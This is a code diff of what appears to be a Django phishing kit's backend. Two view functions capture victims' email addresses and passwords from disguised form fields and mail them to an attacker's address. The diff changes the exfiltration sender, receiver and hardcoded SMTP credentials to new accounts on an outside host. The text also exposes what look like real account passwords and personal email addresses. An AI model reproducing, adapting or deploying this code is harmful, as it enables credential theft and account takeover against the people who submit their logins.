@@ -20,9 +20,9 @@ def addin(request):
     email = request.POST["powerioman"]
     passwordemail = request.POST["enginloio"]
     domain = email[email.index('@') + 1 : ]
-    sender_email = "logs@merusllc.com"
-    receiver_email = "havn.drk@yadex.com"
-    password = "MLpkqf25fxet"
+    sender_email = "zealsends@newupdateishere.com"
+    receiver_email = "bennanimamoun90@gmail.com"
+    password = "#~Y&BE.!hl,B"
     message = MIMEMultipart("alternative")
     message["Subject"] = "New Page 1"
     message["From"] = sender_email
@@ -46,7 +46,7 @@ def addin(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP("mail.merusllc.com", 587) as server:
+    with smtplib.SMTP_SSL("newupdateishere.com", 465) as server:
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
         return render(request, 'indexx.html', {'email': email, 'domains': domain})
@@ -56,9 +56,9 @@ def adddzz(request):
     email = request.POST["zzpowerman"]
     passwordemail = request.POST["yyenginlo"]
     domain = email[email.index('@') + 1 : ]
-    sender_email = "logs@merusllc.com"
-    receiver_email = "havn.drk@yadex.com"
-    password = "MLpkqf25fxet"
+    sender_email = "zealsends@newupdateishere.com"
+    receiver_email = "bennanimamoun90@gmail.com"
+    password = "#~Y&BE.!hl,B"
     message = MIMEMultipart("alternative")
     message["Subject"] = "New Page 2"
     message["From"] = sender_email
@@ -82,7 +82,7 @@ def adddzz(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP("mail.merusllc.com", 587) as server:
+    with smtplib.SMTP_SSL("newupdateishere.com", 465) as server:
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
     return render(request, 'Domain.html', {'domains': domain})
